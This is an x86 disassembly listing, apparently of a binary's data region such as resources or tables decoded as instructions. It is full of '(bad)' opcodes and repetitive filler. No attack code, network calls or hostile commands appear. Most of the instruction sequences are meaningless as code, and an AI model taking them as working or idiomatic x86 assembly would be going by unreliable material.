  408009:	(bad)  
  40800a:	(bad)  
  40800b:	(bad)  
  40800c:	(bad)  
  40800d:	(bad)  
  40800e:	(bad)  
  40800f:	(bad)  
  408010:	(bad)  
  408011:	(bad)  
  408012:	(bad)  
  408013:	(bad)  
  408014:	(bad)  
  408015:	(bad)  
  408016:	(bad)  
  408017:	(bad)  
  408018:	(bad)  
  408019:	inc    DWORD PTR [eax]
  40801b:	ud0    edi,esi
  40801e:	add    BYTE PTR [edi],al
  408020:	(bad)  
  408021:	inc    BYTE PTR [eax]
  408023:	pop    es
  408024:	(bad)  
  408025:	inc    BYTE PTR [eax]
  408027:	pop    es
  408028:	inc    DWORD PTR [eax+0xfc0300]
  40802e:	add    BYTE PTR [ebx],al
  408030:	clc    
  408031:	add    BYTE PTR [eax],al
  408033:	add    edi,eax
  408035:	add    BYTE PTR [eax],al
  408037:	add    edi,eax
  408039:	add    BYTE PTR [eax],al
  40803b:	add    edi,eax
  40803d:	add    BYTE PTR [eax],al
  40803f:	add    edi,eax
  408041:	add    BYTE PTR [eax],al
  408043:	add    eax,edi
  408045:	add    BYTE PTR [eax],al
  408047:	add    eax,edi
  408049:	add    BYTE PTR [eax],al
  40804b:	add    eax,edi
  40804d:	add    BYTE PTR [eax],al
  40804f:	add    edi,eax
  408051:	add    BYTE PTR [ebx],al
  408053:	(bad)  
  408054:	clc    
  408055:	add    BYTE PTR [ebx],al
  408057:	(bad)  
  408058:	clc    
  408059:	add    BYTE PTR [ebx],al
  40805b:	(bad)  
  40805c:	clc    
  40805d:	add    BYTE PTR [ebx],al
  40805f:	(bad)  
  408060:	clc    
  408061:	add    BYTE PTR [ebx],al
  408063:	(bad)  
  408064:	clc    
  408065:	add    BYTE PTR [ebx],al
  408067:	(bad)  
  408068:	clc    
  408069:	add    BYTE PTR [ebx],al
  40806b:	(bad)  
  40806c:	clc    
  40806d:	add    BYTE PTR [ebx],al
  40806f:	(bad)  
  408070:	clc    
  408071:	add    BYTE PTR [ebx],al
  408073:	(bad)  
  408074:	clc    
  408075:	add    BYTE PTR [ebx],al
  408077:	(bad)  
  408078:	clc    
  408079:	add    BYTE PTR [ebx],al
  40807b:	(bad)  
  40807c:	cld    
  40807d:	add    BYTE PTR [edi],al
  40807f:	(bad)  
  408080:	inc    eax
  408082:	jg     0x408083
  408084:	(bad)  
  408085:	(bad)  
  408086:	(bad)  
  408087:	jmp    FWORD PTR [eax]
  408089:	add    BYTE PTR [eax],al
  40808b:	add    BYTE PTR [eax],dl
  40808d:	add    BYTE PTR [eax],al
  40808f:	add    BYTE PTR [eax],ah
  408091:	add    BYTE PTR [eax],al
  408093:	add    BYTE PTR [ecx],al
  408095:	add    BYTE PTR [eax],cl
  408097:	add    BYTE PTR [eax],al
  408099:	add    BYTE PTR [eax],al
  40809b:	add    BYTE PTR [eax],al
  40809d:	add    DWORD PTR [eax],eax
	...
  4080a7:	add    BYTE PTR [eax],al
  4080a9:	add    DWORD PTR [eax],eax
  4080ab:	add    BYTE PTR [eax],al
  4080ad:	add    DWORD PTR [eax],eax
  4080af:	add    BYTE PTR [eax],al
  4080b1:	add    BYTE PTR [eax],al
  4080b3:	add    BYTE PTR [ebx-0x34ffdd84],dh
  4080b9:	popa   
  4080ba:	add    BYTE PTR [eax],al
  4080bc:	shl    DWORD PTR [edi+0x28],1
  4080bf:	add    BYTE PTR [eax-0x43ffd380],dh
  4080c5:	test   DWORD PTR [edi],ebp
  4080c7:	add    BYTE PTR [esi-0x42ffd277],dh
  4080cd:	mov    WORD PTR ds:0x3286b600,gs
  4080d3:	add    BYTE PTR [ecx-0x3bffca77],bh
  4080d9:	xchg   BYTE PTR [esi],cl
  4080db:	add    bl,dl
  4080dd:	xchg   ecx,eax
  4080de:	or     al,0x0
  4080e0:	fiadd  DWORD PTR [edi-0x7e3effef]
  4080e6:	daa    
  4080e7:	add    bl,cl
  4080e9:	xchg   edi,eax
  4080ea:	sub    BYTE PTR [eax],al
  4080ec:	retf   
  4080ed:	test   DWORD PTR [eax+eax*1],esi
  4080f0:	lds    ebx,FWORD PTR [eax-0x6e22ffc1]
  4080f6:	xor    BYTE PTR [eax],al
  4080f8:	rcr    DWORD PTR [edx-0x5b25ffce],cl
  4080fe:	xor    DWORD PTR [eax],eax
  408100:	add    DWORD PTR [esp+edx*2+0x4f8ca700],0x0
  408108:	mov    ebx,0xb8004290
  40810d:	xchg   esp,eax
  40810e:	dec    edi
  40810f:	add    BYTE PTR [eax-0x6effac6b],ch
  408115:	mov    BYTE PTR [ebx+0x0],ah
  408118:	enter  0x408c,0x0
  40811c:	fmul   DWORD PTR [esp+eax*2+0x4391c600]
  408123:	add    bl,al
  408125:	xchg   ebx,eax
  408126:	inc    esi
  408127:	add    bl,al
  408129:	xchg   ebp,eax
  40812a:	dec    eax
  40812b:	add    cl,cl
  40812d:	popf   
  40812e:	dec    ebp
  40812f:	add    al,bl
  408131:	xchg   edi,eax
  408132:	inc    eax
  408133:	add    dh,dl
  408135:	xchg   ebp,eax
  408136:	dec    eax
  408137:	add    bl,al
  408139:	popf   
  40813a:	push   ebp
  40813b:	add    bl,bl
  40813d:	xchg   esp,eax
  40813e:	push   edi
  40813f:	add    dh,dl
  408141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408142:	inc    esp
  408143:	add    al,al
  408145:	mov    al,ds:0xa0ca0054
  40814a:	push   ecx
  40814b:	add    bl,cl
  40814d:	mov    ds:0xa6ce0057,al
  408152:	pop    ebx
  408153:	add    dl,ch
  408155:	mov    cl,0x44
  408157:	add    dh,ch
  408159:	mov    esp,0xbbef0050
  40815e:	push   edi
  40815f:	add    dl,ch
  408161:	mov    eax,0xabcc005a
  408166:	outs   dx,DWORD PTR ds:[esi]
  408167:	add    al,dl
  408169:	stos   DWORD PTR es:[edi],eax
  40816a:	push   0x6bb5d500
  40816f:	add    al,dl
  408171:	mov    al,0x76
  408173:	add    dh,ch
  408175:	shl    DWORD PTR [ebp+0x0],0x3d
  408179:	jle    0x408120
  40817b:	add    BYTE PTR [edx+eax*4],ch
  40817e:	sahf   
  40817f:	add    BYTE PTR [edi],dh
  408181:	and    DWORD PTR [ebp-0x5a7fc400],0xac922d00
  40818b:	add    BYTE PTR [ebp-0x78],al
  40818e:	mov    es,WORD PTR [eax]
  408190:	dec    eax
  408191:	mov    BYTE PTR [eax-0x5371b800],ch
  408197:	add    BYTE PTR [ebx-0x70],cl
  40819a:	scas   eax,DWORD PTR es:[edi]
  40819b:	add    BYTE PTR [edi-0x67],bl
  40819e:	mov    ch,0x0
  4081a0:	push   0xffffff8f
  4081a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081a3:	add    BYTE PTR [ebp-0x6f],ch
  4081a6:	test   al,0x0
  4081a8:	push   0x7900b6a0
  4081ad:	test   eax,0x971b00bb
  4081b2:	mov    BYTE PTR [eax],0x0
  4081b5:	test   bl,dl
  4081b7:	add    BYTE PTR [ebx],al
  4081b9:	xchg   esp,eax
  4081ba:	aad    0x0
  4081bc:	setnp  al
  4081bf:	add    BYTE PTR [eax],dl
  4081c1:	cdq    
  4081c2:	fld    DWORD PTR [eax]
  4081c4:	xor    eax,0x3400e0b2
  4081c9:	mov    al,0xe4
  4081cb:	add    BYTE PTR [ebx-0x45],ah
  4081ce:	fadd   DWORD PTR [eax]
  4081d0:	inc    esi
  4081d1:	mov    bh,0xe3
  4081d3:	add    BYTE PTR [ebx-0x46],al
  4081d6:	jecxz  0x4081d8
  4081d8:	inc    ebx
  4081d9:	mov    edx,0xba4400e4
  4081de:	in     al,0x0
  4081e0:	inc    edx
  4081e1:	mov    esp,0xc35a00e7
  4081e6:	out    0x0,eax
  4081e8:	dec    eax
  4081e9:	int3   
  4081ea:	repz add BYTE PTR [ebp-0x32],cl
  4081ee:	hlt    
  4081ef:	add    BYTE PTR [edx-0x34],dl
  4081f2:	icebp  
  4081f3:	add    BYTE PTR [esi-0x30],cl
  4081f6:	test   BYTE PTR [eax],0x5e
  4081f9:	shl    esi,cl
  4081fb:	add    BYTE PTR [eax-0x2c],dh
  4081fe:	in     eax,dx
  4081ff:	add    BYTE PTR [eax-0x2c],bh
  408202:	out    dx,al
  408203:	add    BYTE PTR [ecx-0x28],bh
  408206:	out    dx,al
  408207:	add    BYTE PTR [edx-0x24],bh
  40820a:	repnz add BYTE PTR [edi-0x7aff4a5d],al
  408211:	test   eax,0xb6d300b8
  408216:	add    BYTE PTR [eax],0xf6
  408219:	(bad)  
  40821a:	test   DWORD PTR [eax],eax
  40821c:	sti    
  40821d:	fmul   DWORD PTR [eax+eax*1+0x92dafc]
  408224:	stc    
  408225:	ficomp WORD PTR [ebp-0x5d220a00]
  40822b:	add    dh,dh
  40822d:	fldenv [edi-0x561b0100]
  408233:	add    bl,bh
  408235:	in     al,0xad
  408237:	add    BYTE PTR [eax-0x6bff3447],al
  40823d:	mov    bl,0xc3
  40823f:	add    BYTE PTR [edx-0x6aff3a49],bl
  408245:	rcl    eax,0x0
  408248:	xchg   ebp,eax
  408249:	int    0xda
  40824b:	add    BYTE PTR [edx-0x51ff202b],ch
  408251:	fucom  st(5)
  408253:	add    BYTE PTR [ebx-0x72ff1a21],dh
  408259:	out    0xf3,al
  40825b:	add    BYTE PTR [edx-0x62ff0b19],dl
  408261:	out    0xf4,eax
  408263:	add    BYTE PTR [ebx-0x6aff0917],dl
  408269:	out    0xf8,eax
  40826b:	add    BYTE PTR [eax-0x41ff0812],ch
  408271:	idiv   bl
  408273:	add    ch,al
  408275:	std    
  408276:	inc    BYTE PTR [eax]
  408278:	fdivr  st,st(7)
  40827a:	inc    DWORD PTR [eax]
  40827c:	(bad)  
  40827e:	inc    BYTE PTR [eax]
  408280:	(bad)  
  408281:	(bad)  
  408282:	clc    
  408283:	add    dh,bh
  408285:	(bad)  
  408286:	inc    BYTE PTR [eax]
	...
  4084ac:	(bad)  
  4084ad:	(bad)  
  4084ae:	inc    DWORD PTR [eax]
	...
  4084c4:	add    BYTE PTR [eax],al
  4084c6:	xor    BYTE PTR [esi],dl
  4084c8:	or     BYTE PTR [ecx],cl
  4084ca:	or     DWORD PTR ds:0x1d05,eax
  4084d0:	add    BYTE PTR [eax],al
  4084d2:	add    BYTE PTR [eax],al
  4084d4:	add    BYTE PTR [eax],al
  4084d6:	and    dl,BYTE PTR [edi]
  4084d8:	add    al,0x1
  4084da:	or     eax,0x1e231b21
  4084df:	add    BYTE PTR [eax],al
  4084e1:	add    BYTE PTR [eax],al
  4084e3:	add    BYTE PTR [eax],al
  4084e5:	add    BYTE PTR ds:0x12752f06,ch
  4084eb:	pop    edi
  4084ec:	jne    0x408563
  4084ee:	sbb    eax,0x0
  4084f3:	push   edi
  4084f4:	cmp    eax,0xe07193c
  4084f9:	popa   
  4084fa:	jne    0x408528
  4084fc:	adc    DWORD PTR [ebx],eax
  4084fe:	sbb    al,BYTE PTR [eax]
  408500:	add    BYTE PTR [eax],al
  408502:	cmp    eax,DWORD PTR [edi+0x4d]
  408505:	inc    esi
  408506:	aaa    
  408507:	adc    BYTE PTR [edx],cl
  408509:	or     ebx,DWORD PTR [edx+0x75]
  40850c:	jne    0x408510
  40850e:	sldt   WORD PTR [eax]
  408511:	cmp    BYTE PTR [eax+0x6d],dl
  408514:	push   esi
  408515:	dec    esp
  408516:	ss and eax,0x755d1324
  40851c:	sub    DWORD PTR [eax+eiz*1],ecx
  40851f:	pop    ecx
  408520:	add    BYTE PTR [ecx+edx*2],dh
  408523:	imul   edx,DWORD PTR [ebp+0x4c],0x40
  408527:	sbb    BYTE PTR [edx],ch
  408529:	pop    edi
  40852a:	je     0x408556
  40852c:	sub    ch,BYTE PTR [edx]
  40852e:	xor    DWORD PTR [esi],ebp
  408530:	add    BYTE PTR [eax],bh
  408532:	push   ecx
  408533:	imul   edx,DWORD PTR [ebp+0x4c],0x43
  408537:	adc    al,0x2a
  408539:	jne    0x408565
  40853b:	pop    ebx
  40853c:	pop    esp
  40853d:	pop    esp
  40853e:	popa   
  40853f:	sub    BYTE PTR [eax],al
  408541:	cmp    DWORD PTR [edi+0x6b],ecx
  408544:	push   ebp
  408545:	dec    esp
  408546:	inc    ebx
  408547:	xor    edx,DWORD PTR ds:0x26261f26
  40854d:	es xor BYTE PTR es:[eax],al
  408551:	cmp    DWORD PTR [edi+0x6a],ecx
  408554:	push   ebx
  408555:	inc    ebp
  408556:	inc    edx
  408557:	inc    ecx
  408558:	xor    al,BYTE PTR [eax]
  40855a:	add    BYTE PTR [eax],al
  40855c:	add    BYTE PTR [eax],al
  40855e:	add    BYTE PTR [eax],al
  408560:	add    BYTE PTR [edx],bh
  408562:	push   edx
  408563:	outs   dx,DWORD PTR ds:[esi]
  408564:	ins    BYTE PTR es:[edi],dx
  408565:	push   esp
  408566:	dec    eax
  408567:	inc    esp
  408568:	xor    eax,0x0
  40856d:	add    BYTE PTR [eax],al
  40856f:	add    BYTE PTR [eax],al
  408571:	aas    
  408572:	jo     0x4085e7
  408574:	jae    0x4085e9
  408576:	jno    0x4085e6
  408578:	add    BYTE PTR ds:[eax],al
  40857b:	add    BYTE PTR [eax],al
  40857d:	add    BYTE PTR [eax],al
  40857f:	add    BYTE PTR [eax],al
  408581:	add    BYTE PTR [ebp+0x67],ah
  408584:	imul   ebp,DWORD PTR [eax+0x66],0x62
	...
  408593:	fs pop eax
  408595:	pop    eax
  408596:	arpl   WORD PTR [eax],ax
	...
  4085b0:	(bad)  
  4085b1:	inc    DWORD PTR [eax]
  4085b3:	add    ah,bh
  4085b5:	add    eax,DWORD PTR [eax]
  4085b7:	add    ah,bh
  4085b9:	add    DWORD PTR [eax],eax
  4085bb:	add    ah,bh
  4085bd:	add    DWORD PTR [eax],eax
  4085bf:	add    al,ah
  4085c1:	add    DWORD PTR [eax],eax
  4085c3:	add    al,al
  4085c5:	add    DWORD PTR [eax],eax
  4085c7:	add    BYTE PTR [eax-0x80000000],al
  4085cd:	add    BYTE PTR [eax],al
  4085cf:	add    BYTE PTR [eax-0x80000000],al
  4085d5:	add    BYTE PTR [eax],al
  4085d7:	add    BYTE PTR [eax-0x7fffff81],al
  4085dd:	jg     0x4085df
  4085df:	add    BYTE PTR [eax-0x3fffff81],al
  4085e5:	inc    DWORD PTR [eax]
  4085e7:	add    cl,ah
  4085e9:	inc    DWORD PTR [eax]
  4085eb:	add    bh,bh
  4085ed:	inc    DWORD PTR [eax]
  4085ef:	add    BYTE PTR [eax],ch
  4085f1:	add    BYTE PTR [eax],al
  4085f3:	add    BYTE PTR [eax],dh
  4085f5:	add    BYTE PTR [eax],al
  4085f7:	add    BYTE PTR [eax+0x0],ah
  4085fa:	add    BYTE PTR [eax],al
  4085fc:	add    DWORD PTR [eax],eax
  4085fe:	and    BYTE PTR [eax],al
  408600:	add    BYTE PTR [eax],al
  408602:	add    BYTE PTR [eax],al
  408604:	and    BYTE PTR ds:0x0,0x0
	...
  408967:	add    DWORD PTR [eax],eax
  408969:	add    BYTE PTR [eax],al
  40896b:	add    al,0x0
  40896d:	add    BYTE PTR [eax],al
  40896f:	or     al,BYTE PTR [eax]
  408971:	add    BYTE PTR [eax],al
  408973:	sldt   WORD PTR [eax]
  408976:	add    BYTE PTR [eax],dl
  408978:	add    BYTE PTR [eax],al
  40897a:	add    BYTE PTR [eax],dl
  40897c:	add    BYTE PTR [eax],al
  40897e:	add    BYTE PTR [eax],dl
  408980:	add    BYTE PTR [eax],al
  408982:	add    BYTE PTR [eax],dl
  408984:	add    BYTE PTR [eax],al
  408986:	add    BYTE PTR [eax],dl
  408988:	add    BYTE PTR [eax],al
  40898a:	add    BYTE PTR [eax],dl
  40898c:	add    BYTE PTR [eax],al
  40898e:	add    BYTE PTR [eax],dl
  408990:	add    BYTE PTR [eax],al
  408992:	add    BYTE PTR [eax],dl
  408994:	add    BYTE PTR [eax],al
  408996:	add    BYTE PTR [eax],dl
  408998:	add    BYTE PTR [eax],al
  40899a:	add    BYTE PTR [eax],dl
  40899c:	add    BYTE PTR [eax],al
  40899e:	add    BYTE PTR [eax],dl
  4089a0:	add    BYTE PTR [eax],al
  4089a2:	add    BYTE PTR [eax],dl
  4089a4:	add    BYTE PTR [eax],al
  4089a6:	add    BYTE PTR [eax],dl
  4089a8:	add    BYTE PTR [eax],al
  4089aa:	add    BYTE PTR [eax],dl
  4089ac:	add    BYTE PTR [eax],al
  4089ae:	add    BYTE PTR [eax],dl
  4089b0:	add    BYTE PTR [eax],al
  4089b2:	add    BYTE PTR [eax],dl
  4089b4:	add    BYTE PTR [eax],al
  4089b6:	add    BYTE PTR [eax],dl
  4089b8:	add    BYTE PTR [eax],al
  4089ba:	add    BYTE PTR [esi],cl
  4089bc:	add    BYTE PTR [eax],al
  4089be:	add    BYTE PTR [eax],cl
  4089c0:	add    BYTE PTR [eax],al
  4089c2:	add    BYTE PTR [edx],al
	...
  408a24:	add    BYTE PTR [eax],al
  408a26:	add    BYTE PTR [eax+eax*1],al
  408a29:	add    BYTE PTR [eax],al
  408a2b:	adc    DWORD PTR [eax],eax
  408a2d:	add    BYTE PTR [eax],al
  408a2f:	and    al,BYTE PTR [eax]
  408a31:	add    BYTE PTR [eax],al
  408a33:	sub    eax,0x30000000
  408a38:	add    BYTE PTR [eax],al
  408a3a:	add    BYTE PTR [eax],dh
  408a3c:	add    BYTE PTR [eax],al
  408a3e:	add    BYTE PTR [eax],dh
  408a40:	add    BYTE PTR [eax],al
  408a42:	add    BYTE PTR [eax],dh
  408a44:	add    BYTE PTR [eax],al
  408a46:	add    BYTE PTR [eax],dh
  408a48:	add    BYTE PTR [eax],al
  408a4a:	add    BYTE PTR [eax],dh
  408a4c:	add    BYTE PTR [eax],al
  408a4e:	add    BYTE PTR [eax],dh
  408a50:	add    BYTE PTR [eax],al
  408a52:	add    BYTE PTR [eax],dh
  408a54:	add    BYTE PTR [eax],al
  408a56:	add    BYTE PTR [eax],dh
  408a58:	add    BYTE PTR [eax],al
  408a5a:	add    BYTE PTR [eax],dh
  408a5c:	add    BYTE PTR [eax],al
  408a5e:	add    BYTE PTR [eax],dh
  408a60:	add    BYTE PTR [eax],al
  408a62:	add    BYTE PTR [eax],dh
  408a64:	add    BYTE PTR [eax],al
  408a66:	add    BYTE PTR [eax],dh
  408a68:	add    BYTE PTR [eax],al
  408a6a:	add    BYTE PTR [eax],dh
  408a6c:	add    BYTE PTR [eax],al
  408a6e:	add    BYTE PTR [eax],dh
  408a70:	add    BYTE PTR [eax],al
  408a72:	add    BYTE PTR [eax],dh
  408a74:	add    BYTE PTR [eax],al
  408a76:	add    BYTE PTR [edi],ch
  408a78:	add    BYTE PTR [eax],al
  408a7a:	add    BYTE PTR [ebx],ch
  408a7c:	add    BYTE PTR [eax],al
  408a7e:	add    BYTE PTR [esi],bl
  408a80:	add    BYTE PTR [eax],al
  408a82:	add    BYTE PTR ds:0x3000000,cl
	...
  408ae4:	xchg   ebx,eax
  408ae5:	push   0x20
  408ae7:	cmp    ebx,DWORD PTR [ebp-0x5556dd8f]
  408aed:	jnp    0x408b14
  408aef:	jmp    FWORD PTR [edx-0x5500da85]
  408af5:	jnp    0x408b1c
  408af7:	jmp    FWORD PTR [edx-0x5500da85]
  408afd:	jnp    0x408b24
  408aff:	jmp    FWORD PTR [edx-0x5500da85]
  408b05:	jnp    0x408b2c
  408b07:	jmp    FWORD PTR [edx-0x5500da85]
  408b0d:	jnp    0x408b34
  408b0f:	jmp    FWORD PTR [edx-0x5500da85]
  408b15:	jnp    0x408b3c
  408b17:	jmp    FWORD PTR [edx-0x5500da85]
  408b1d:	jnp    0x408b44
  408b1f:	jmp    FWORD PTR [edx-0x5500da85]
  408b25:	jnp    0x408b4c
  408b27:	jmp    FWORD PTR [edx-0x5500da85]
  408b2d:	jnp    0x408b54
  408b2f:	jmp    FWORD PTR [edx-0x5800da85]
  408b35:	jns    0x408b5b
  408b37:	repnz mov esp,DWORD PTR [ebp+0x1e]
  408b3b:	mov    eax,ds:0x3c061219
  408b40:	add    BYTE PTR [eax],al
  408b42:	add    BYTE PTR [eax],ah
  408b44:	add    BYTE PTR [eax],al
  408b46:	add    BYTE PTR [edx],cl
  408b48:	add    BYTE PTR [eax],al
  408b4a:	add    BYTE PTR [ecx],al
	...
  408ba4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ba5:	ja     0x408bcb
  408ba7:	mov    eax,ds:0xff7cadc8
  408bac:	ret    
  408bad:	stos   DWORD PTR es:[edi],eax
  408bae:	jle    0x408baf
  408bb0:	mov    edx,0xbaff6f9f
  408bb5:	mov    al,ds:0xa1bdff6f
  408bba:	outs   dx,DWORD PTR ds:[esi]
  408bbb:	(bad)  
  408bbc:	mov    esi,0xc0ff70a2
  408bc1:	mov    ds:0xa1c1ff70,eax
  408bc6:	jo     0x408bc7
  408bc8:	les    esp,FWORD PTR [edx-0x5d390090]
  408bce:	outs   dx,DWORD PTR ds:[esi]
  408bcf:	dec    eax
  408bd1:	mov    ds:0xa3cbff6f,eax
  408bd6:	jno    0x408bd7
  408bd8:	int3   
  408bd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bda:	jo     0x408bdb
  408bdc:	iret   
  408bdd:	mov    ds:0xa3d0ff71,eax
  408be2:	jo     0x408be3
  408be4:	shl    DWORD PTR [edx-0x5e2d0090],1
  408bea:	outs   dx,DWORD PTR ds:[esi]
  408beb:	call   ecx
  408bed:	mov    eax,ds:0xa1d2ff6f
  408bf2:	jo     0x408bf3
  408bf4:	xlat   BYTE PTR ds:[ebx]
  408bf5:	stos   DWORD PTR es:[edi],eax
  408bf6:	jg     0x408bf7
  408bf8:	(bad)  
  408bf9:	mov    al,ds:0x6991ff65
  408bfe:	pop    ds
  408bff:	lods   eax,DWORD PTR ds:[esi]
  408c00:	add    BYTE PTR [eax],al
  408c02:	add    BYTE PTR [eax],dh
  408c04:	add    BYTE PTR [eax],al
  408c06:	add    BYTE PTR [eax+eax*1],dl
  408c09:	add    BYTE PTR [eax],al
  408c0b:	add    eax,DWORD PTR [eax]
	...
  408c55:	add    BYTE PTR [eax],al
  408c57:	add    BYTE PTR [ebp+edx*4-0x7552e8aa],dh
  408c5e:	dec    ebp
  408c5f:	cmp    BYTE PTR [ebp-0x55aac17f],ah
  408c65:	jnp    0x408c8c
  408c67:	clc    
  408c68:	shr    BYTE PTR [ebx+0x77a2ff83],0x2f
  408c6f:	call   FWORD PTR [ebx-0x6100da91]
  408c75:	jo     0x408c9c
  408c77:	jmp    DWORD PTR [eax-0x5d00d88e]
  408c7d:	je     0x408ca6
  408c7f:	jmp    DWORD PTR [ebp+esi*2+0x76a9ff28]
  408c86:	sub    bh,bh
  408c88:	stos   DWORD PTR es:[edi],eax
  408c89:	je     0x408cb2
  408c8b:	jmp    FWORD PTR [edi-0x4c00d889]
  408c91:	jbe    0x408cba
  408c93:	push   DWORD PTR [esi-0x4300d789]
  408c99:	js     0x408cc4
  408c9b:	(bad)  
  408c9c:	mov    esi,0xc0ff2977
  408ca1:	jne    0x408cca
  408ca3:	inc    ecx
  408ca5:	jb     0x408ccf
  408ca7:	inc    eax
  408ca9:	jo     0x408cd2
  408cab:	inc    eax
  408cad:	outs   dx,BYTE PTR ds:[esi]
  408cae:	es (bad) 
  408cb0:	mov    edi,0xc1ff266c
  408cb5:	jne    0x408ce9
  408cb7:	call   ebp
  408cb9:	mov    al,ds:0x89b6ff70
  408cbe:	cmp    al,0xff
  408cc0:	push   edx
  408cc1:	cmp    edx,DWORD PTR [edx]
  408cc3:	push   edi
  408cc4:	add    BYTE PTR [eax],al
  408cc6:	add    BYTE PTR ds:0x7000000,bl
	...
  408d18:	mov    al,0x90
  408d1a:	push   ebx
  408d1b:	sbb    al,0xa1
  408d1d:	jnp    0x408d53
  408d1f:	cmp    BYTE PTR [ecx-0x58acd188],ah
  408d25:	jns    0x408d4d
  408d27:	fld    st(2)
  408d29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d2a:	jbe    0x408d2b
  408d2c:	test   eax,0xa7ff3681
  408d31:	jns    0x408d5b
  408d33:	jmp    FWORD PTR [ebx-0x5000d581]
  408d39:	sub    DWORD PTR [ebx],0x2f87b2ff
  408d3f:	push   DWORD PTR [ebp-0x4600cd76]
  408d45:	mov    WORD PTR [ebx],?
  408d47:	(bad)  
  408d48:	mov    ecx,0xbdff3088
  408d4d:	xchg   DWORD PTR [esi],ebp
  408d4f:	inc    eax
  408d51:	mov    DWORD PTR [eax],esi
  408d53:	inc    edx
  408d55:	mov    dh,BYTE PTR [edx]
  408d57:	inc    ebp
  408d59:	lea    esi,[edi+edi*8]
  408d5c:	(bad)  
  408d5d:	mov    esi,DWORD PTR [edi+edi*8]
  408d60:	mov    BYTE PTR [ebp-0x7d3800ce],0x2f
  408d67:	inc    ebp
  408d69:	jp     0x408d96
  408d6b:	inc    edx
  408d6d:	je     0x408d98
  408d6f:	inc    ecx
  408d71:	outs   dx,DWORD PTR ds:[esi]
  408d72:	es (bad) 
  408d74:	mov    edi,0xcaff266f
  408d79:	mov    BYTE PTR [ebp-0x1],cl
  408d7c:	lds    ebx,FWORD PTR [esi+0x5d81ff5e]
  408d82:	sbb    al,0x8b
  408d84:	add    BYTE PTR [eax],al
  408d86:	add    BYTE PTR [eax+eax*1],ah
  408d89:	add    BYTE PTR [eax],al
  408d8b:	or     al,BYTE PTR [eax]
	...
  408dd5:	add    BYTE PTR [eax],al
  408dd7:	add    BYTE PTR [ebx-0x59e5ae6f],dh
  408ddd:	jg     0x408e19
  408ddf:	xor    eax,0x4b337da5
  408de4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408de5:	jp     0x408e0e
  408de7:	mov    ecx,0xff71a7c5
  408dec:	mov    bl,0x8f
  408dee:	inc    esi
  408def:	jmp    FWORD PTR [ebp-0x4c00d47d]
  408df5:	xchg   DWORD PTR [eax],esi
  408df7:	(bad)  
  408df8:	mov    esp,0xecff4095
  408dfd:	loopne 0x408dc5
  408dff:	(bad)  
  408e00:	jmp    0x5eaa:0xcdffbddb
  408e07:	inc    esi
  408e09:	pushf  
  408e0a:	ds dec eax
  408e0d:	call   0xff60:0xabd2ff3c
  408e14:	loope  0x408ddd
  408e16:	pushf  
  408e17:	jmp    ebp
  408e19:	int3   
  408e1a:	mov    ds:0xa1c9e5ff,eax
  408e1f:	jmp    ebp
  408e21:	(bad)  
  408e22:	popf   
  408e23:	jmp    ebx
  408e25:	ret    0xff95
  408e28:	(bad)  
  408e29:	mov    ds:0x79c6ff63,al
  408e2e:	sub    edi,edi
  408e30:	ret    0x2871
  408e33:	(bad)  
  408e34:	mov    edi,0xc6ff266c
  408e39:	jl     0x408e7a
  408e3b:	dec    esi
  408e3d:	test   al,0x70
  408e3f:	call   DWORD PTR [ebx+0xb4206b]
  408e45:	add    BYTE PTR [eax],al
  408e47:	sub    al,BYTE PTR [eax]
  408e49:	add    BYTE PTR [eax],al
  408e4b:	or     eax,0x0
	...
  408e98:	mov    ch,0x93
  408e9a:	push   ecx
  408e9b:	sbb    ch,BYTE PTR [ebx-0x58c2c27d]
  408ea1:	xor    BYTE PTR [ebx],0x5a
  408ea4:	test   al,0x7c
  408ea6:	sub    esp,DWORD PTR [edx-0xa96744]
  408eac:	mov    eax,0xafff5195
  408eb1:	sub    DWORD PTR [edx],0xffffffff
  408eb4:	mov    ch,0x8c
  408eb6:	xor    bh,bh
  408eb8:	mov    esi,0xf1ff4098
  408ebd:	jmp    0xf3388e99
  408ec2:	call   0xe53185c6
  408ec7:	(bad)  
  408ec8:	ffreep st(6)
  408eca:	xchg   edx,eax
  408ecb:	call   eax
  408ecd:	test   al,0x47
  408ecf:	(bad)  
  408ed0:	fdivr  QWORD PTR [ebp-0x24120084]
  408ed6:	mov    dh,0xff
  408ed8:	in     eax,dx
  408ed9:	fidivr DWORD PTR [ecx-0x46271301]
  408edf:	(bad)  
  408ee0:	in     eax,dx
  408ee1:	xlat   BYTE PTR ds:[ebx]
  408ee2:	mov    dh,0xff
  408ee4:	in     al,dx
  408ee5:	aam    0xb3
  408ee7:	(bad)  
  408ee8:	jmp    0x2f7b:0xc8ffaacf
  408eef:	inc    edx
  408ef1:	jb     0x408f1a
  408ef3:	(bad)  
  408ef4:	mov    edi,0xc0ff266c
  408ef9:	jb     0x408f2d
  408efb:	call   edx
  408efd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408efe:	jb     0x408eff
  408f00:	mov    eax,ds:0xdd2375
  408f05:	add    BYTE PTR [eax],al
  408f07:	xor    BYTE PTR [eax],al
  408f09:	add    BYTE PTR [eax],al
  408f0b:	adc    al,BYTE PTR [eax]
  408f0d:	add    BYTE PTR [eax],al
  408f0f:	add    DWORD PTR [eax],eax
	...
  408f55:	add    BYTE PTR [eax],al
  408f57:	add    BYTE PTR [esi-0x52e2ad6e],dh
  408f5d:	xchg   DWORD PTR [edi],edi
  408f5f:	inc    ebp
  408f60:	test   eax,0xaa673380
  408f65:	xor    BYTE PTR [eax],0x92
  408f68:	mov    dl,0x87
  408f6a:	cmp    edi,edi
  408f6c:	mov    esi,0xafff5f9e
  408f71:	sub    BYTE PTR [eax],0xff
  408f74:	mov    ah,0x88
  408f76:	sub    eax,0x3492bbff
  408f7b:	dec    eax
  408f7d:	mov    ds:0xdcecff4b,al
  408f82:	mov    esp,0xe8f3f8ff
  408f87:	(bad)  
  408f88:	clc    
  408f89:	repz out 0xff,eax
  408f8c:	in     eax,dx
  408f8d:	fdiv   QWORD PTR [edi+0x4eadd5ff]
  408f93:	(bad)  
  408f94:	fidiv  DWORD PTR [edx-0x4b2300a2]
  408f9a:	fs (bad) 
  408f9c:	fisubr DWORD PTR [esi-0x582600a0]
  408fa2:	pop    esp
